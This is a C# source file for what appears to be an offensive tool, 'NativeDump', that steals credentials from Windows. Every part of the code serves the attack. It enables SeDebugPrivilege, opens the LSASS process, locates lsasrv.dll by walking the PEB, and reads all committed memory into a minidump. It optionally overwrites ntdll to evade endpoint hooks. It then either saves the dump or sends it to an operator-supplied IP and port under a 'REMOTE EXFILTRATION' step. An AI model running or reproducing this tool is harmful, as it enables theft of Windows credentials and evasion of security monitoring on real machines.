using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static NativeDump.Win32;
using static NativeDump.CreateFile;
using static NativeDump.Overwrite;


namespace NativeDump
{
    internal class Program
    {
        // ═══════════════════════════════════════
        // Helper: Protection name
        // ═══════════════════════════════════════
        static string ProtectStr(int p)
        {
            switch (p)
            {
                case 0x01: return "PAGE_NOACCESS";
                case 0x02: return "PAGE_READONLY";
                case 0x04: return "PAGE_READWRITE";
                case 0x08: return "PAGE_WRITECOPY";
                case 0x10: return "PAGE_EXECUTE";
                case 0x20: return "PAGE_EXECUTE_READ";
                case 0x40: return "PAGE_EXECUTE_READWRITE";
                case 0x80: return "PAGE_EXECUTE_WRITECOPY";
                case 0x104: return "PAGE_READWRITE|PAGE_GUARD";
                default: return "0x" + p.ToString("X");
            }
        }

        // ═══════════════════════════════════════
        // Helper: State name
        // ═══════════════════════════════════════
        static string StateStr(int s)
        {
            switch (s)
            {
                case 0x1000: return "MEM_COMMIT";
                case 0x2000: return "MEM_RESERVE";
                case 0x10000: return "MEM_FREE";
                default: return "0x" + s.ToString("X");
            }
        }


        // ═══════════════════════════════════════
        // SeDebugPrivilege (verbose)
        // ═══════════════════════════════════════
        static void EnableDebugPrivileges()
        {
            Console.WriteLine("\n[+] === ENABLING SeDebugPrivilege ===");
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            Console.WriteLine("    [+] Current process handle:  " + currentProcess);
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                Console.WriteLine("    [+] NtOpenProcessToken:      NTSTATUS 0x" + ntstatus.ToString("X") + " - Token handle: " + tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("    [-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 },
                    Attributes = 0x00000002
                };
                Console.WriteLine("    [+] TOKEN_PRIVILEGES:        PrivilegeCount=1, LUID LowPart=20, HighPart=0, Attributes=0x2 (SE_PRIVILEGE_ENABLED)");

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                Console.WriteLine("    [+] NtAdjustPrivilegesToken: NTSTATUS 0x" + ntstatus.ToString("X"));
                if (ntstatus != 0)
                {
                    Console.WriteLine("    [-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Console.WriteLine("    [-] Maybe you need to run the program as administrator.");
                    Environment.Exit(-1);
                }
                Console.WriteLine("    [+] SeDebugPrivilege enabled successfully.");
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                    Console.WriteLine("    [+] Token handle closed.");
                }
            }
        }


        // ═══════════════════════════════════════
        // Read remote pointer (silent errors)
        // ═══════════════════════════════════════
        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0)
            {
                return IntPtr.Zero;
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        // ═══════════════════════════════════════
        // Read remote wide string
        // ═══════════════════════════════════════
        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0)
            {
                return "";
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        // ═══════════════════════════════════════
        // PEB walking to find lsasrv.dll (verbose)
        // ═══════════════════════════════════════
        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name)
        {
            Console.WriteLine("\n[+] === ENUMERATING MODULES (PEB WALKING) ===");
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_offset = 0x50;
            int flink_fulldllname_offset = 0x40;

            if (IntPtr.Size == 4)
            {
                Console.WriteLine("    [+] Detected 32-bit process, adjusting offsets.");
                process_basic_information_size = 24;
                peb_offset = 0x4;
                ldr_offset = 0x0c;
                inInitializationOrderModuleList_offset = 0x1c;
                flink_dllbase_offset = 0x18;
                flink_buffer_offset = 0x30;
                flink_fulldllname_offset = 0x28;
            }
            else
            {
                Console.WriteLine("    [+] 64-bit process detected.");
            }

            byte[] pbi_byte_array = new byte[process_basic_information_size];

            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;
                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                Console.WriteLine("    [+] NtQueryInformationProcess: NTSTATUS 0x" + ntstatus.ToString("X") + " (ReturnLength=" + ReturnLength + ")");
                if (ntstatus != 0)
                {
                    Console.WriteLine("    [-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
                Console.WriteLine("    [+] PROCESS_BASIC_INFORMATION at: 0x" + pbi_addr.ToString("X"));
            }

            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
            Console.WriteLine("    [+] PEB Address:                  0x" + pebaddress.ToString("X"));

            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
            if (ldr_adress == IntPtr.Zero)
            {
                Console.WriteLine("    [-] PEB structure is not readable (Ldr is null).");
                Environment.Exit(0);
            }
            Console.WriteLine("    [+] PEB->Ldr:                     0x" + ldr_adress.ToString("X"));

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            Console.WriteLine("    [+] InInitializationOrderModuleList: 0x" + InInitializationOrderModuleList.ToString("X"));

            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
            Console.WriteLine("    [+] First Flink:                  0x" + next_flink.ToString("X"));
            Console.WriteLine("    [+] Walking module list...");

            IntPtr dll_base = (IntPtr)1337;
            IntPtr found_address = IntPtr.Zero;
            int moduleCount = 0;

            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
                if (dll_base == IntPtr.Zero) break;

                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));
                string base_dll_name = ReadRemoteWStr(hProcess, buffer);

                IntPtr fullbuffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_fulldllname_offset));
                string full_dll_name = ReadRemoteWStr(hProcess, fullbuffer);

                moduleCount++;
                string marker = "";
                if (dll_name.ToLower() == base_dll_name.ToLower())
                {
                    found_address = dll_base;
                    marker = " <-- TARGET";
                }
                Console.WriteLine("        Module " + moduleCount.ToString().PadLeft(3) + ": " + base_dll_name.PadRight(30) + " Base: 0x" + dll_base.ToString("X") + marker);
                if (full_dll_name.Length > 0)
                {
                    Console.WriteLine("                  Path: " + full_dll_name);
                }

                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));
            }

            Console.WriteLine("    [+] Total modules found: " + moduleCount);
            if (found_address != IntPtr.Zero)
            {
                Console.WriteLine("    [+] " + dll_name + " found at: 0x" + found_address.ToString("X"));
            }
            else
            {
                Console.WriteLine("    [-] " + dll_name + " NOT found in module list!");
            }

            return found_address;
        }


        // ═══════════════════════════════════════
        // CLI argument parsing
        // ═══════════════════════════════════════
        static void ParseArgs(string[] args, out string option, out string path, out string outputFile, out string ipAddress, out int port)
        {
            option = "";
            path = "";
            outputFile = "";
            ipAddress = "";
            port = 0;

            for (int i = 0; i < args.Length; i++)
            {
                if ((args[i] == "-o" || args[i] == "--option") && i + 1 < args.Length)
                    option = args[++i];
                else if ((args[i] == "-k" || args[i] == "--path") && i + 1 < args.Length)
                    path = args[++i];
                else if ((args[i] == "-f" || args[i] == "--file") && i + 1 < args.Length)
                    outputFile = args[++i];
                else if ((args[i] == "-i" || args[i] == "--ip") && i + 1 < args.Length)
                    ipAddress = args[++i];
                else if ((args[i] == "-p" || args[i] == "--port") && i + 1 < args.Length)
                    port = Convert.ToInt32(args[++i]);
            }
        }


        // ═══════════════════════════════════════
        // Main
        // ═══════════════════════════════════════
        static void Main(string[] args)
        {
            Console.WriteLine("[+] =============================================");
            Console.WriteLine("[+]   NativeDump - Debug Branch");
            Console.WriteLine("[+] =============================================");

            // Check binary is correctly compiled
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] File must be compiled as 64-bit binary.");
                Environment.Exit(-1);
            }
            Console.WriteLine("[+] Running as 64-bit process.");

            // Parse arguments
            ParseArgs(args, out string option, out string path, out string outputFile, out string ipAddress, out int port);

            Console.WriteLine("\n[+] === ARGUMENTS ===");
            Console.WriteLine("    [+] Overwrite:  " + (option != "" ? option : "none"));
            Console.WriteLine("    [+] Path:       " + (path != "" ? path : "default"));
            Console.WriteLine("    [+] Output:     " + (outputFile != "" ? outputFile : "proc_<PID>.dmp"));
            Console.WriteLine("    [+] Remote:     " + (ipAddress != "" && port > 0 ? ipAddress + ":" + port : "local"));

            // Ntdll overwrite
            if (option != "")
            {
                Console.WriteLine("\n[+] === NTDLL OVERWRITE ===");
                ReplaceLibrary(option, path);
            }

            // Find lsass process
            Console.WriteLine("\n[+] === FINDING LSASS PROCESS ===");
            string procname = "lsass";
            Console.WriteLine("    [+] Process name: " + procname);
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("    [-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("    [+] Process PID:  " + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle with NtOpenProcess
            Console.WriteLine("\n[+] === OPENING LSASS HANDLE ===");
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            Console.WriteLine("    [+] CLIENT_ID:     UniqueProcess=" + processPID + ", UniqueThread=0");
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            Console.WriteLine("    [+] NtOpenProcess: NTSTATUS 0x" + ntstatus.ToString("X") + " (DesiredAccess=PROCESS_QUERY_INFORMATION|PROCESS_VM_READ = 0x" + (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ).ToString("X") + ")");
            if (ntstatus != 0)
            {
                Console.WriteLine("    [-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                Environment.Exit(-1);
            }
            Console.WriteLine("    [+] Process handle: " + processHandle);

            // Get lsasrv.dll information via PEB walking
            IntPtr lsasrvdll_address = CustomGetModuleHandle(processHandle, "lsasrv.dll");

            // Loop the memory regions
            Console.WriteLine("\n[+] === DUMPING MEMORY REGIONS ===");
            Console.WriteLine("    [+] Scanning address space 0x0 - 0x7FFFFFFEFFFF");
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = IntPtr.Zero;
            byte[] memory_regions = { };
            List<Memory64Info> mem64info_List = new List<Memory64Info>();

            int lsasrvdll_size = 0;
            bool tracking_lsasrv = false;
            int regionCount = 0;
            int dumpedCount = 0;
            long totalDumpedBytes = 0;

            while ((long)mem_address < proc_max_address_l)
            {
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    break;
                }

                regionCount++;
                bool isDumped = (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT);
                string action = isDumped ? "DUMPED" : "SKIPPED";

                Console.WriteLine("    [+] Region " + regionCount.ToString().PadLeft(5) + ": Base=0x" + mbi.BaseAddress.ToString("X").PadLeft(16, '0')
                    + " Size=0x" + ((long)mbi.RegionSize).ToString("X").PadLeft(8, '0') + " (" + ((long)mbi.RegionSize).ToString().PadLeft(10) + ")"
                    + " Protect=" + ProtectStr(mbi.Protect).PadRight(28) + " State=" + StateStr(mbi.State).PadRight(12) + " -> " + action);

                if (isDumped)
                {
                    Memory64Info mem64info = new Memory64Info();
                    mem64info.Address = mbi.BaseAddress;
                    mem64info.Size = mbi.RegionSize;
                    mem64info_List.Add(mem64info);

                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    ntstatus = NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    if (ntstatus != 0 && ntstatus != 0x8000000D)
                    {
                        Console.WriteLine("    [-] NtReadVirtualMemory failed for region at 0x" + mbi.BaseAddress.ToString("X") + ": NTSTATUS 0x" + ntstatus.ToString("X"));
                    }
                    byte[] new_bytearray = new byte[memory_regions.Length + buffer.Length];
                    Buffer.BlockCopy(memory_regions, 0, new_bytearray, 0, memory_regions.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, memory_regions.Length, buffer.Length);
                    memory_regions = new_bytearray;

                    dumpedCount++;
                    totalDumpedBytes += (long)mbi.RegionSize;

                    // Track lsasrv.dll size
                    if (mbi.BaseAddress == lsasrvdll_address)
                    {
                        tracking_lsasrv = true;
                        Console.WriteLine("         >>> lsasrv.dll tracking: ENTERED at 0x" + mbi.BaseAddress.ToString("X"));
                    }
                    if (tracking_lsasrv)
                    {
                        if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdll_address)
                        {
                            tracking_lsasrv = false;
                            Console.WriteLine("         >>> lsasrv.dll tracking: EXITED (0x1000 boundary), final size: 0x" + lsasrvdll_size.ToString("X") + " (" + lsasrvdll_size + " bytes)");
                        }
                        else
                        {
                            lsasrvdll_size += (int)mbi.RegionSize;
                        }
                    }

                    if (dumpedCount % 50 == 0)
                    {
                        double mb = totalDumpedBytes / (1024.0 * 1024.0);
                        Console.WriteLine("         ... " + dumpedCount + " regions dumped so far (" + mb.ToString("F2") + " MB)");
                    }
                }

                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }

            double totalMB = totalDumpedBytes / (1024.0 * 1024.0);
            Console.WriteLine("    [+] Total: " + dumpedCount + " regions dumped, " + totalDumpedBytes + " bytes (" + totalMB.ToString("F2") + " MB)");
            Console.WriteLine("    [+] Total regions scanned: " + regionCount);

            // Module information summary
            Console.WriteLine("\n[+] === MODULE INFORMATION ===");
            Console.WriteLine("    [+] lsasrv.dll Address: 0x" + lsasrvdll_address.ToString("X"));
            Console.WriteLine("    [+] lsasrv.dll Size:    0x" + lsasrvdll_size.ToString("X") + " (" + lsasrvdll_size + " bytes)");

            // Generate Minidump
            Console.WriteLine("\n[+] === GENERATING MINIDUMP ===");
            byte[] dumpBytes = CreateMinidump(lsasrvdll_address, lsasrvdll_size, mem64info_List, memory_regions);
            Console.WriteLine("    [+] Minidump size: " + dumpBytes.Length + " bytes (" + (dumpBytes.Length / (1024.0 * 1024.0)).ToString("F2") + " MB)");

            // Output
            if (ipAddress != "" && port > 0)
            {
                Console.WriteLine("\n[+] === REMOTE EXFILTRATION ===");
                SendMinidump(dumpBytes, ipAddress, port);
            }
            else
            {
                string dumpfile = outputFile != "" ? outputFile : "proc_" + processPID + ".dmp";
                Console.WriteLine("\n[+] === SAVING TO DISK ===");
                SaveMinidump(dumpBytes, dumpfile);
            }

            // Cleanup
            Console.WriteLine("\n[+] === CLEANUP ===");
            ntstatus = NtClose(processHandle);
            Console.WriteLine("    [+] NtClose process handle: NTSTATUS 0x" + ntstatus.ToString("X"));
            Console.WriteLine("    [+] Done.");
        }
    }
}
